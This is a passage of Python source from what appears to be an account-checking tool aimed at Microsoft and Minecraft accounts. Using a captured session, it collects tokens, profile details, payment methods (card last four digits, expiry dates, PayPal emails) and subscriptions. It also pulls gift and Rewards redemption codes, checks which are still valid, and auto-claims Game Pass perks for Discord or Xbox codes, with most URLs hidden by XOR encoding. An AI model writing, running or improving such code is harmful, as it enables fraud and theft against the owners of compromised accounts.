        xsts_mc = r.json().get("Token", "")
    except Exception:
        xsts_mc = ""

    if not xsts_mc:
        return AuthResult("no_xsts", ms_token=ms_token, xbox_token=xbox_token, uhs=uhs)

    await rl_mojang.acquire()
    try:
        r = await sess.post(
            ("".join(chr(c^193)for c in[169, 181, 181, 177, 178, 251, 238, 238, 160, 177, 168, 239, 172, 168, 175, 164, 162, 179, 160, 167, 181, 178, 164, 179, 183, 168, 162, 164, 178, 239, 162, 174, 172, 238, 160, 180, 181, 169, 164, 175, 181, 168, 162, 160, 181, 168, 174, 175, 238, 173, 174, 166, 168, 175, 158, 182, 168, 181, 169, 158, 185, 163, 174, 185])),
            json={"identityToken": f"XBL3.0 x={uhs};{xsts_mc}"},
            headers=json_h,
        )
    except Exception as e:
        return AuthResult(
            "error", ms_token=ms_token, xbox_token=xbox_token,
            uhs=uhs, xsts_mc_token=xsts_mc, details=f"MC: {e}",
        )

    if r.status_code == 429:
        rl_mojang.slow_down()
        return AuthResult("rate_limited")

    try:
        mc_token = r.json().get("access_token", "")
    except Exception:
        mc_token = ""

    if not mc_token:
        return AuthResult(
            "no_mc", ms_token=ms_token, xbox_token=xbox_token,
            uhs=uhs, xsts_mc_token=xsts_mc,
        )

    return AuthResult(
        status="success",
        ms_token=ms_token, xbox_token=xbox_token, uhs=uhs,
        xsts_mc_token=xsts_mc, mc_token=mc_token, lang=lang,
    )

# --- class MCProfile ---
@dataclass
class MCProfile:
    name:         str  = "N/A"
    uuid:         str  = "N/A"
    capes:        str  = "None"
    renameable:   str  = "Unknown"
    name_changed: str  = "None"
    created:      bool = False

# --- fetch_mc_profile ---
async def fetch_mc_profile(sess: AsyncSession, mc_token: str) -> MCProfile:
    api_h = {"Authorization": f"Bearer {mc_token}", "Accept": "application/json"}

    async def _profile() -> object:
        await rl_mojang.acquire()
        return await sess.get(
            ("".join(chr(c^221)for c in[181, 169, 169, 173, 174, 231, 242, 242, 188, 173, 180, 243, 176, 180, 179, 184, 190, 175, 188, 187, 169, 174, 184, 175, 171, 180, 190, 184, 174, 243, 190, 178, 176, 242, 176, 180, 179, 184, 190, 175, 188, 187, 169, 242, 173, 175, 178, 187, 180, 177, 184])),
            headers=api_h, timeout=14,
        )

    async def _namechange() -> object:
        await rl_mojang.acquire()
        return await sess.get(
            ("".join(chr(c^130)for c in[234, 246, 246, 242, 241, 184, 173, 173, 227, 242, 235, 172, 239, 235, 236, 231, 225, 240, 227, 228, 246, 241, 231, 240, 244, 235, 225, 231, 241, 172, 225, 237, 239, 173, 239, 235, 236, 231, 225, 240, 227, 228, 246, 173, 242, 240, 237, 228, 235, 238, 231, 173, 236, 227, 239, 231, 225, 234, 227, 236, 229, 231])),
            headers=api_h, timeout=14,
        )

    pr, nr = await asyncio.gather(_profile(), _namechange(), return_exceptions=True)
    result = MCProfile()

    if isinstance(pr, Exception) or pr is None:
        return result
    if pr.status_code == 404:
        return MCProfile()
    if pr.status_code == 429:
        rl_mojang.slow_down()
    if pr.status_code == 200:
        try:
            pj            = pr.json()
            result.name   = pj.get("name", "N/A")
            result.uuid   = pj.get("id",   "N/A")
            result.capes  = (
                ", ".join(c.get("alias", "") for c in pj.get("capes", []) if c.get("alias"))
                or "None"
            )
            result.created = True
        except Exception:
            pass

    if not isinstance(nr, Exception) and nr is not None and nr.status_code == 200:
        try:
            nj = nr.json()
            result.renameable = str(nj.get("nameChangeAllowed", "Unknown"))
            changed_at = nj.get("changedAt", "")
            if changed_at:
                result.name_changed = f"Changed: {changed_at[:10]}"
        except Exception:
            pass

    return result

ACCOUNT_TYPES = frozenset({
    "Java", "Bedrock", "GamePass Ultimate", "GamePass PC",
    "Legends", "Dungeons", "None",
})

# --- fetch_account_type ---
async def fetch_account_type(sess: AsyncSession, mc_token: str) -> str:
    api_h = {"Authorization": f"Bearer {mc_token}", "Accept": "application/json"}
    items: list[dict] = []

    await rl_mojang.acquire()
    try:
        r = await sess.get(
            f"https://api.minecraftservices.com/entitlements/license"
            f"?requestId={uuid.uuid4()}",
            headers=api_h, timeout=14,
        )
        if r.status_code == 200:
            items = r.json().get("items", [])
        elif r.status_code == 429:
            rl_mojang.slow_down()
    except Exception:
        pass

    if not items:
        await rl_mojang.acquire()
        try:
            r = await sess.get(
                ("".join(chr(c^106)for c in[2, 30, 30, 26, 25, 80, 69, 69, 11, 26, 3, 68, 7, 3, 4, 15, 9, 24, 11, 12, 30, 25, 15, 24, 28, 3, 9, 15, 25, 68, 9, 5, 7, 69, 15, 4, 30, 3, 30, 6, 15, 7, 15, 4, 30, 25, 69, 7, 9, 25, 30, 5, 24, 15])),
                headers=api_h, timeout=14,
            )
            if r.status_code == 200:
                items = r.json().get("items", [])
        except Exception:
            pass

    names = [i.get("name", "") for i in items if isinstance(i, dict)]
    if "product_game_pass_ultimate" in names:
        return "GamePass Ultimate"
    if "product_game_pass_pc" in names:
        return "GamePass PC"
    if "product_minecraft" in names:
        return "Java"
    if "product_minecraft_bedrock" in names:
        return "Bedrock"
    if "product_legends" in names:
        return "Legends"
    if "product_dungeons" in names:
        return "Dungeons"
    return "None"

# --- fetch_rewards ---
async def fetch_rewards(sess: AsyncSession, lang: str) -> tuple[str, list[dict]]:
    if not config.modules.get("rewards", True):
        return "N/A", []
    OAUTH_URL = (
        ("".join(chr(c^40)for c in[64, 92, 92, 88, 91, 18, 7, 7, 68, 71, 79, 65, 70, 6, 68, 65, 94, 77, 6, 75, 71, 69, 7, 71, 73, 93, 92, 64, 26, 24, 119, 73, 93, 92, 64, 71, 90, 65, 82, 77, 6, 91, 90, 78])) +
        "?client_id=0000000048183522" +
        "&redirect_uri=https://login.live.com/oauth20_desktop.srf" +
        "&scope=service::prod.rewardsplatform.microsoft.com::MBI_SSL" +
        "&response_type=token&display=touch&locale=en"
    )
    UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    base_h = {"Accept-Language": lang, "User-Agent": UA,
               "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
    form_h = {**base_h, "Content-Type": "application/x-www-form-urlencoded"}
    clone  = None
    balance_str = "N/A"
    rewards_codes: list[dict] = []
    try:
        clone = await clone_session(sess)
        token = await _follow_oauth(clone, OAUTH_URL, base_h, form_h)
        if not token:
            return balance_str, rewards_codes

        # The Xbox channel returns the fullest response schema (24 fields
        # incl. `orders` for redemption history).  Same token, same request
        # cost as the old `/dapi/me` call so no extra latency.
        rr = await clone.get(
            ("".join(chr(c^206)for c in[166, 186, 186, 190, 189, 244, 225, 225, 190, 188, 161, 170, 224, 188, 171, 185, 175, 188, 170, 189, 190, 162, 175, 186, 168, 161, 188, 163, 224, 163, 167, 173, 188, 161, 189, 161, 168, 186, 224, 173, 161, 163, 225, 170, 175, 190, 167, 225, 163, 171, 241, 173, 166, 175, 160, 160, 171, 162, 243, 150, 172, 161, 182])),
            headers={"Authorization": f"Bearer {token}", "Accept": "application/json",
                     "User-Agent": UA},
            timeout=12,
        )
        if rr.status_code == 200:
            try:
                data = rr.json()
            except Exception:
                data = {}
            resp = data.get("response") if isinstance(data, dict) else None
            if not isinstance(resp, dict):
                resp = data if isinstance(data, dict) else {}

            val = (
                resp.get("balance")
                or resp.get("availablePoints")
                or resp.get("points")
                or (resp.get("userInfo") or {}).get("balance")
            )
            if val is not None:
                try:
                    balance_str = f"{int(val):,}"
                except Exception:
                    pass

            # Parse redemption history — the `orders` field carries every
            # gift-card / voucher / product code the user has ever redeemed
            # rewards points for.  On accounts that never redeemed it will
            # be null or empty.  The schema varies wildly across redemption
            # types (Xbox 5x5 codes, Amazon codes, Starbucks, donations with
            # no code, etc.) so extraction is intentionally defensive.
            seen_codes: set[str] = set()
            for entry in _iter_reward_orders(resp.get("orders")):
                if not isinstance(entry, dict):
                    continue

                title  = _reward_title(entry)
                region = _reward_region(entry)

                # One order can bundle several codes (e.g. a multi-pack), so
                # emit an entry per distinct code found within it.
                codes = _extract_reward_codes(entry)
                for code in codes:
                    if code and code not in seen_codes:
                        seen_codes.add(code)
                        rewards_codes.append({
                            "code":   code,
                            "title":  str(title),
                            "region": region,
                        })
    except Exception as e:
        await log_error("Rewards", e)
    finally:
        if clone:
            await _close_sess(clone)
    return balance_str, rewards_codes

CURRENCY_SYMBOLS: dict[str, str] = {
    "USD": "$",    "EUR": "€",    "GBP": "£",    "CAD": "CA$",  "AUD": "A$",
    "NZD": "NZ$",  "BRL": "R$",   "JPY": "¥",    "INR": "₹",    "RUB": "₽",
    "MXN": "Mex$", "TRY": "₺",    "KRW": "₩",    "CHF": "CHF ", "ZAR": "R",
    "PLN": "zł",   "SEK": "kr",   "NOK": "kr",   "DKK": "kr",   "ILS": "₪",
}

# --- class PaymentInfo ---
@dataclass
class PaymentInfo:
    balance_str:  str   = "None"
    balance_val:  float = 0.0
    methods_str:  str   = "None"

# --- fetch_payment ---
async def fetch_payment(sess: AsyncSession, lang: str) -> PaymentInfo:
    DELEGATE_URL = (
        ("".join(chr(c^19)for c in[123, 103, 103, 99, 96, 41, 60, 60, 127, 124, 116, 122, 125, 61, 127, 122, 101, 118, 61, 112, 124, 126, 60, 124, 114, 102, 103, 123, 33, 35, 76, 114, 102, 103, 123, 124, 97, 122, 105, 118, 61, 96, 97, 117])) +
        "?client_id=000000000004773A" +
        "&response_type=token" +
        "&scope=PIFD.Read%20PIFD.Create%20PIFD.Update%20PIFD.Delete" +
        "&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth" +
        "&prompt=none" +
        "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
    )
    UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    base_h = {"Accept-Language": lang, "User-Agent": UA,
              "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
    form_h = {**base_h, "Content-Type": "application/x-www-form-urlencoded"}
    result = PaymentInfo()
    clone  = None
    try:
        clone = await clone_session(sess)

        delegate_token = await _follow_oauth(clone, DELEGATE_URL, base_h, form_h)

        if not delegate_token:
            return result

        pi_r = await clone.get(
            ("".join(chr(c^234)for c in[130, 158, 158, 154, 153, 208, 197, 197, 154, 139, 147, 135, 143, 132, 158, 131, 132, 153, 158, 152, 159, 135, 143, 132, 158, 153, 196, 135, 154, 196, 135, 131, 137, 152, 133, 153, 133, 140, 158, 196, 137, 133, 135])) +
            "/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
            headers={
                "Authorization": f'MSADELEGATE1.0="{delegate_token}"',
                "Accept":        "application/json",
                "Origin":        ("".join(chr(c^88)for c in[48, 44, 44, 40, 43, 98, 119, 119, 57, 59, 59, 55, 45, 54, 44, 118, 53, 49, 59, 42, 55, 43, 55, 62, 44, 118, 59, 55, 53])),
                "User-Agent":    UA,
            },
            timeout=12,
        )
        if pi_r.status_code != 200:
            return result

        raw   = pi_r.json()
        items = (
            raw
            if isinstance(raw, list)
            else raw.get("value") or raw.get("paymentInstruments") or []
        )

        methods: list[str] = []
        total_bal          = 0.0
        currency           = "USD"

        for pm in items:
            if not isinstance(pm, dict):
                continue
            details = pm.get("details", {}) or {}
            try:
                bal = float(details.get("balance") or 0)
            except Exception:
                bal = 0.0
            curr = (details.get("currency") or "USD").upper()
            if bal > 0:
                total_bal += bal
                currency   = curr

            paym      = pm.get("paymentMethod", {}) or {}
            pm_type   = (paym.get("paymentMethodType",   "") or "").lower()
            pm_family = (paym.get("paymentMethodFamily", "") or "").lower()
            if str(pm.get("status", "")).lower() != "active":
                continue

            if pm_type == "paypal":
                pp_email = details.get("email") or details.get("accountEmailAddress") or "Unknown"
                methods.append(f"PayPal ({pp_email})")
            elif pm_family == "credit_card":
                brand = (
                    (paym.get("display", {}) or {}).get("name")
                    or details.get("cardType")
                    or "Card"
                )
                last4 = details.get("lastFourDigits") or "****"
                em = details.get("expiryMonth")
                ey = details.get("expiryYear")
                try:
                    if em is not None and ey is not None:
                        val_m = int(em)
                        val_y = int(ey)
                        now_dt = datetime.now()
                        if val_y < now_dt.year or (val_y == now_dt.year and val_m < now_dt.month):
                            continue
                except Exception:
                    pass

                try:
                    em_s = f"{int(em):02d}" if em is not None else "??"
                except Exception:
                    em_s = "??"
                try:
                    ey_s = str(ey)[-2:] if ey is not None else "??"
                except Exception:
                    ey_s = "??"
                methods.append(f"{brand} *{last4} exp {em_s}/{ey_s}")

        if total_bal > 0:
            sym = CURRENCY_SYMBOLS.get(currency, f"{currency} ")
            result.balance_str = f"{sym}{total_bal:,.2f} {currency}"
            result.balance_val = total_bal
        if methods:
            result.methods_str = ", ".join(methods)
    except Exception as e:
        await log_error("Payment", e)
    finally:
        if clone:
            await _close_sess(clone)
    return result

# --- _get_purchase_token ---
async def _get_purchase_token(sess: AsyncSession, lang: str) -> str:
    OAUTH_URL = (
        ("".join(chr(c^250)for c in[146, 142, 142, 138, 137, 192, 213, 213, 150, 149, 157, 147, 148, 212, 150, 147, 140, 159, 212, 153, 149, 151, 213, 149, 155, 143, 142, 146, 200, 202, 165, 155, 143, 142, 146, 149, 136, 147, 128, 159, 212, 137, 136, 156])) +
        "?client_id=0000000048093EE3" +
        "&redirect_uri=https://login.live.com/oauth20_desktop.srf" +
        "&response_type=token" +
        "&scope=service::purchase.mp.microsoft.com::MBI_SSL"
    )
    UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    base_h = {"Accept-Language": lang, "User-Agent": UA}
    form_h = {**base_h, "Content-Type": "application/x-www-form-urlencoded"}
    clone  = None
    try:
        clone = await clone_session(sess)
        token = await _follow_oauth(clone, OAUTH_URL, base_h, form_h)
        return token
    except Exception as e:
        await log_error("PurchaseToken", e)
        return ""
    finally:
        if clone:
            await _close_sess(clone)

# --- fetch_subscriptions ---
async def fetch_subscriptions(sess: AsyncSession, purchase_token: str) -> str:
    if not purchase_token:
        return "None"
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    try:
        async with AsyncSession(
            impersonate=random.choice(TARGETS), timeout=14, verify=False
        ) as s:
            r = await s.get(
                ("".join(chr(c^88)for c in[48, 44, 44, 40, 43, 98, 119, 119, 40, 45, 42, 59, 48, 57, 43, 61, 118, 53, 40, 118, 53, 49, 59, 42, 55, 43, 55, 62, 44, 118, 59, 55, 53, 119, 46, 111, 118, 104, 119, 45, 43, 61, 42, 43, 119, 53, 61, 119, 43, 45, 58, 43, 59, 42, 49, 40, 44, 49, 55, 54, 43])),
                headers={
                    "Authorization": f'WLID1.0="{purchase_token}"',
                    "Accept":        "application/json",
                    "User-Agent":    UA,
                },
            )
            if r.status_code != 200:
                return "None"
            data  = r.json()
            items = data if isinstance(data, list) else data.get("items", [])
            names: list[str] = []
            for s_item in items:
                if not isinstance(s_item, dict):
                    continue
                state = str(s_item.get("status") or s_item.get("state") or "").lower()
                if state in ("cancelled", "suspended", "expired", "disabled", "inactive", "revoked"):
                    continue
                name = (
                    s_item.get("productTitle")
                    or s_item.get("displayTitle")
                    or s_item.get("title")
                    or s_item.get("name")
                    or "Unknown Subscription"
                )
                end = s_item.get("nextChargeDateUtc") or s_item.get("expirationDate") or ""
                if end:
                    try:
                        end = end[:10]
                    except Exception:
                        pass
                    names.append(f"{name} (Renews: {end})")
                else:
                    names.append(f"{name} (Active)")
            return ", ".join(names) if names else "None"
    except Exception as e:
        await log_error("Subscriptions", e)
        return "None"

_GC_RE = re.compile(
    r'\b([A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5}-[A-Za-z0-9]{5})\b'
)

_COUNTRY_TO_ISO_UPPER: dict[str, str] = {
    "UNITED STATES": "US",       "USA":                  "US",  "AMERICA":  "US",
    "UNITED KINGDOM":"GB",       "GREAT BRITAIN":        "GB",  "BRITAIN":  "GB",
                                 "ENGLAND":              "GB",  "UK":       "GB",
    "AUSTRALIA":     "AU",       "NEW ZEALAND":          "NZ",
    "CANADA":        "CA",       "MEXICO":               "MX",
    "BRAZIL":        "BR",       "ARGENTINA":            "AR",  "CHILE":    "CL",
    "COLOMBIA":      "CO",       "PERU":                 "PE",
    "GERMANY":       "DE",       "DEUTSCHLAND":          "DE",
    "FRANCE":        "FR",       "SPAIN":                "ES",  "ESPAÑA":   "ES",
    "ITALY":         "IT",       "ITALIA":               "IT",
    "NETHERLANDS":   "NL",       "NEDERLAND":            "NL",  "HOLLAND":  "NL",
    "BELGIUM":       "BE",       "PORTUGAL":             "PT",
    "SWEDEN":        "SE",       "NORWAY":               "NO",  "DENMARK":  "DK",
    "FINLAND":       "FI",       "IRELAND":              "IE",
    "POLAND":        "PL",       "CZECH REPUBLIC":       "CZ",  "CZECHIA":  "CZ",
    "HUNGARY":       "HU",       "ROMANIA":              "RO",  "BULGARIA": "BG",
    "GREECE":        "GR",       "AUSTRIA":              "AT",  "SWITZERLAND":"CH",
    "RUSSIA":        "RU",       "UKRAINE":              "UA",  "TURKEY":   "TR",
    "ISRAEL":        "IL",       "SAUDI ARABIA":         "SA",
    "UNITED ARAB EMIRATES":       "AE",                          "UAE":      "AE",
    "EGYPT":         "EG",       "SOUTH AFRICA":         "ZA",  "NIGERIA":  "NG",
    "KENYA":         "KE",
    "JAPAN":         "JP",       "CHINA":                "CN",  "HONG KONG":"HK",
    "TAIWAN":        "TW",       "SOUTH KOREA":          "KR",  "KOREA":    "KR",
    "SINGAPORE":     "SG",       "MALAYSIA":             "MY",
    "INDONESIA":     "ID",       "PHILIPPINES":          "PH",  "THAILAND": "TH",
    "VIETNAM":       "VN",       "INDIA":                "IN",  "PAKISTAN": "PK",
    "GLOBAL":        "US",
}

# --- _validate_gift_code ---
async def _validate_gift_code(
    code: str, purchase_token: str, market: str = "US"
) -> tuple[bool, str]:
    clean = "".join(c for c in code.upper() if c.isalnum())
    if len(clean) != 25:
        return False, "Invalid format"

    market = (market or "US").strip()
    if market.upper() in _COUNTRY_TO_ISO_UPPER:
        market = _COUNTRY_TO_ISO_UPPER[market.upper()]
    else:
        market = market.upper()
    if len(market) != 2 or not market.isalpha():
        market = "US"

    url = (
        f"https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/{clean}"
        f"?market={market}&language=en-US&supportMultiAvailabilities=true"
    )
    try:
        async with AsyncSession(
            impersonate=random.choice(TARGETS), timeout=12, verify=False
        ) as s:
            r = await s.get(url, headers={
                "Authorization": f'WLID1.0="{purchase_token}"',
                "Accept":        "application/json",
                "User-Agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            })
            if r.status_code == 200:
                d     = r.json()
                state = (d.get("tokenState") or "unknown").lower()
                product = (
                    (d.get("description") or {}).get("productName")
                    or (d.get("description") or {}).get("title")
                    or d.get("productName")
                    or "Unknown"
                )
                return state == "active", product
            if r.status_code == 404:
                return False, "Not Found"
    except Exception as e:
        await log_error(f"ValidateGC:{code}", e)
    return False, "Unknown"

# --- _extract_codes_from_obj ---
def _extract_codes_from_obj(obj, out_codes: set[str]) -> None:
    if isinstance(obj, dict):
        for v in obj.values():
            _extract_codes_from_obj(v, out_codes)
    elif isinstance(obj, list):
        for item in obj:
            _extract_codes_from_obj(item, out_codes)
    elif isinstance(obj, str):
        for m in _GC_RE.findall(obj):
            out_codes.add(m.upper())

# --- _order_title ---
def _order_title(order: dict) -> str:
    for li in order.get("orderLineItems", []) or []:
        if not isinstance(li, dict):
            continue
        pd = li.get("productDescription", {}) or {}
        t = (pd.get("productTitle") or pd.get("title")
             or li.get("productTitle") or li.get("title"))
        if t:
            return str(t).strip()

    for k in ("productTitle", "title", "displayName"):
        v = order.get(k)
        if v:
            return str(v).strip()
    return "Microsoft Gift Code"

# Keys that, at any nesting depth inside an MS Rewards order entry, plausibly
# carry a redemption code (Xbox / Amazon / Starbucks / generic digital codes).
_REWARD_CODE_KEYS = {
    "code", "redemptioncode", "productkey", "tokenstring", "activationcode",
    "vouchercode", "giftcode", "key", "cdkey", "digitalcode", "pin",
    "claimcode", "couponcode", "prepaidcode", "cardcode", "recipientcode",
}

# A code value reachable via a code-bearing key: alphanumerics with optional
# dashes/underscores only (no spaces), length 6-60. Deliberately liberal
# because the key name already signals it's a code, unlike free-text scans.
_REWARD_CODE_VALUE_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9_-]{4,58}[A-Za-z0-9]$')

# --- _extract_reward_codes ---
def _extract_reward_codes(entry) -> set[str]:
    """Pull every redemption code out of one order entry.

    Two complementary strategies:
      1. Key-driven: any key whose name looks code-like whose value passes a
         liberal code shape (catches non-Xbox formats the 5x5 regex misses).
      2. Text-scan: the strict 5x5 Xbox/MS gift-card regex over every string
         (catches codes embedded inside descriptive text).
    """
    found: set[str] = set()

    def _walk(o) -> None:
        if isinstance(o, dict):
            for k, v in o.items():
                if (isinstance(v, str) and k.lower() in _REWARD_CODE_KEYS
                        and _REWARD_CODE_VALUE_RE.match(v.strip())):
                    found.add(v.strip().upper())
                _walk(v)
        elif isinstance(o, list):
            for it in o:
                _walk(it)
        elif isinstance(o, str):
            for m in _GC_RE.findall(o):
                found.add(m.upper())

    _walk(entry)
    return found

# --- _reward_title ---
def _reward_title(entry: dict) -> str:
    """Best-effort human title for a rewards redemption entry."""
    # Reuse the proven order-line-item logic (orderLineItems.productDescription)
    t = _order_title(entry)
    if t and t != "Microsoft Gift Code":
        return t

    for k in ("productName", "name", "title", "displayName", "sku"):
        v = entry.get(k)
        if v:
            return str(v).strip()

    # Look inside nested item collections
    for coll_key in ("items", "orderLineItems", "orderItems", "lineItems"):
        coll = entry.get(coll_key)
        if isinstance(coll, list):
            for li in coll:
                if not isinstance(li, dict):
                    continue
                for k in ("productName", "name", "title", "productTitle", "displayName"):
                    v = li.get(k)
                    if v:
                        return str(v).strip()
    return "MS Rewards Redemption"

# --- _reward_region ---
def _reward_region(entry: dict) -> str:
    for k in ("market", "region", "country", "countryCode", "locale"):
        v = entry.get(k)
        if isinstance(v, str) and v.strip():
            return v.strip().upper()[:5]
    return "US"

# --- _iter_reward_orders ---
def _iter_reward_orders(orders_field) -> list:
    """Normalise the many shapes the `orders` field can arrive in."""
    if isinstance(orders_field, list):
        return orders_field
    if isinstance(orders_field, dict):
        for k in ("items", "orders", "history", "results", "value"):
            v = orders_field.get(k)
            if isinstance(v, list):
                return v
    return []

# --- fetch_gift_codes ---
async def fetch_gift_codes(purchase_token: str) -> list[dict]:
    if not purchase_token or not config.modules.get("giftcodes", True):
        return []

    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    headers = {
        "Authorization": f'WLID1.0="{purchase_token}"',
        "Accept":        "application/json",
        "User-Agent":    UA,
    }

    candidates: dict[str, dict] = {}

    def _absorb(code_upper: str, title: str, region: str) -> None:
        if not code_upper:
            return
        prev = candidates.get(code_upper)
        if prev is None:
            candidates[code_upper] = {"title": title, "region": region}
            return
        if prev["title"] == "Microsoft Gift Code" and title != "Microsoft Gift Code":
            prev["title"] = title
        if prev["region"] in ("", "Global") and region and region != "Global":
            prev["region"] = region

    try:
        async with AsyncSession(
            impersonate=random.choice(TARGETS), timeout=18, verify=False
        ) as s:
            url  = ("".join(chr(c^251)for c in[147, 143, 143, 139, 136, 193, 212, 212, 139, 142, 137, 152, 147, 154, 136, 158, 213, 150, 139, 213, 150, 146, 152, 137, 148, 136, 148, 157, 143, 213, 152, 148, 150, 212, 141, 204, 213, 203, 212, 142, 136, 158, 137, 136, 212, 150, 158, 212, 148, 137, 159, 158, 137, 136]))
            page = 0
            retry_wait = 0.5
            while url and page < 20:
                try:
                    r = await s.get(url, headers=headers)
                except Exception:
                    break

                if r.status_code in (429, 500, 502, 503, 504):
                    if retry_wait < 4.0:
                        await asyncio.sleep(retry_wait + random.uniform(0, 0.3))
                        retry_wait *= 2
                        continue
                    break
                if r.status_code != 200:
                    break

                try:
                    data = r.json()
                except Exception:
                    break

                orders = (
                    data.get("items")
                    or data.get("Items")
                    or (data if isinstance(data, list) else [])
                )
                if not isinstance(orders, list):
                    break

                for order in orders:
                    if not isinstance(order, dict):
                        continue
                    region = str(order.get("market") or "Global")
                    title  = _order_title(order)
                    found: set[str] = set()
                    _extract_codes_from_obj(order, found)
                    for c in found:
                        _absorb(c, title, region)

                url  = data.get("@nextLink") or data.get("nextLink") or ""
                page += 1
                retry_wait = 0.5
    except Exception as e:
        await log_error("GiftCodes", e)

    if not candidates:
        return []

    sem = asyncio.Semaphore(8)

    async def _check(code: str, meta: dict) -> dict | None:
        async with sem:
            try:
                is_valid, product = await _validate_gift_code(
                    code, purchase_token, meta.get("region", "US")
                )
                if is_valid:
                    title = meta["title"]
                    if product and product != "Unknown" and title == "Microsoft Gift Code":
                        title = product
                    return {"code": code, "title": title, "region": meta["region"]}
            except Exception:
                pass
            return None

    results = await asyncio.gather(
        *(_check(c, m) for c, m in candidates.items()),
        return_exceptions=True,
    )
    return [r for r in results if isinstance(r, dict)]

_DISCORD_RE = re.compile(
    r'https?://(?:discord\.gift|discord\.com/gifts|promos\.discord\.gg|'
    r'discordapp\.com/gifts|discord\.com/billing/promotions)/([A-Za-z0-9_-]+)',
    re.I,
)
_XBOX_CODE_RE = re.compile(
    r'\b([A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5})\b'
)

# --- fetch_promos ---
async def fetch_promos(sess: AsyncSession, xbox_token: str, lang: str) -> list[dict]:
    if not xbox_token or not config.modules.get("giftcodes", True):
        return []

    json_h = {"Accept": "application/json", "Content-Type": "application/json"}
    clone  = None
    perks: list[dict] = []

    try:
        clone = await clone_session(sess)

        await rl_xbox.acquire()
        r = await clone.post(
            ("".join(chr(c^206)for c in[166, 186, 186, 190, 189, 244, 225, 225, 182, 189, 186, 189, 224, 175, 187, 186, 166, 224, 182, 172, 161, 182, 162, 167, 184, 171, 224, 173, 161, 163, 225, 182, 189, 186, 189, 225, 175, 187, 186, 166, 161, 188, 167, 180, 171])),
            json={
                "Properties":   {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": ("".join(chr(c^20)for c in[124, 96, 96, 100, 46, 59, 59, 108, 118, 123, 108, 120, 125, 98, 113, 58, 119, 123, 121])),
                "TokenType":    "JWT",
            },
            headers=json_h, timeout=12,
        )
        if r.status_code != 200:
            return []
        xj  = r.json()
        tok = xj.get("Token", "")
        uhs = xj.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs", "")
        if not tok or not uhs:
            return []

        gp_h = {
            "Authorization":   f"XBL3.0 x={uhs};{tok}",
            "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept":          "application/json",
            "Accept-Language": "en-US,en;q=0.9",
        }
        offers_r = await clone.get(
            ("".join(chr(c^200)for c in[160, 188, 188, 184, 187, 242, 231, 231, 184, 186, 167, 174, 161, 164, 173, 230, 175, 169, 165, 173, 184, 169, 187, 187, 230, 171, 167, 165, 231, 190, 250, 231, 167, 174, 174, 173, 186, 187, 247, 164, 169, 166, 175, 189, 169, 175, 173, 245, 173, 166, 229, 157, 155, 238, 165, 169, 186, 163, 173, 188, 245, 157, 155])),
            headers=gp_h, timeout=14,
        )
        if offers_r.status_code != 200:
            return []

        offers = offers_r.json().get("offers", [])
        seen:  set[str] = set()

        offer_title_map = {}
        try:
            offer_pids = {}

            async def _fetch_meta(oid: str) -> tuple[str, str | None]:
                try:
                    mr = await clone.get(
                        f"https://profile.gamepass.com/v2/offers/metadata?id={oid}&language=en-US&market=US",
                        headers=gp_h, timeout=6
                    )
                    if mr.status_code == 200:
                        m_data = mr.json()
                        if m_data and isinstance(m_data, list):
                            pid = m_data[0].get("productId")
                            if pid:
                                return oid, pid
                except Exception:
                    pass
                return oid, None

            offer_ids = [o.get("offerId") for o in offers if o.get("offerId")]
            meta_results = await asyncio.gather(*[_fetch_meta(oid) for oid in offer_ids], return_exceptions=True)
            for res in meta_results:
                if isinstance(res, tuple):
                    oid, pid = res
                    if pid:
                        offer_pids[oid] = pid

            if offer_pids:
                pids_str = ",".join(set(offer_pids.values()))
                cat_r = await clone.get(
                    f"https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds={pids_str}&market=US&languages=en-US",
                    headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"}, timeout=8
                )
                if cat_r.status_code == 200:
                    for p in cat_r.json().get("Products", []):
                        pid = p.get("ProductId")
                        lps = p.get("LocalizedProperties", [{}])
                        p_title = lps[0].get("ProductTitle") or lps[0].get("ShortTitle") if lps else None
                        p_pub = lps[0].get("PublisherName") if lps else ""
                        if p_title:
                            full_title = f"{p_title} | {p_pub}" if p_pub and p_pub not in p_title else p_title
                            for o_id, mapped_pid in offer_pids.items():
                                if mapped_pid == pid:
                                    offer_title_map[o_id] = full_title
        except Exception:
            pass

        async def _claim_offer(offer: dict) -> dict | None:
            oid = offer.get("offerId")
            if not oid:
                return None
            try:
                cr = await clone.post(
                    f"https://profile.gamepass.com/v2/offers/{oid}"
                    "?language=en-US&market=US",
                    json={}, headers=gp_h, timeout=14,
                )
                if cr.status_code != 200:
                    return None

                text     = cr.text
                resource = cr.json().get("resource")
                link: str | None = None

                if isinstance(resource, dict):
                    link = (resource.get("link") or resource.get("url")
                            or resource.get("code"))
                elif isinstance(resource, str):
                    link = resource

                if not link:
                    dm = _DISCORD_RE.search(text)
                    if dm:
                        link = dm.group(0)
                    else:
                        xm = _XBOX_CODE_RE.search(text)
                        if xm:
                            link = xm.group(1)

                if not link:
                    return None

                low_link = link.lower()
                if (("".join(chr(c^30)for c in[122, 119, 109, 125, 113, 108, 122, 48, 125, 113, 115, 49, 109, 123, 106, 106, 119, 112, 121, 109])) in low_link
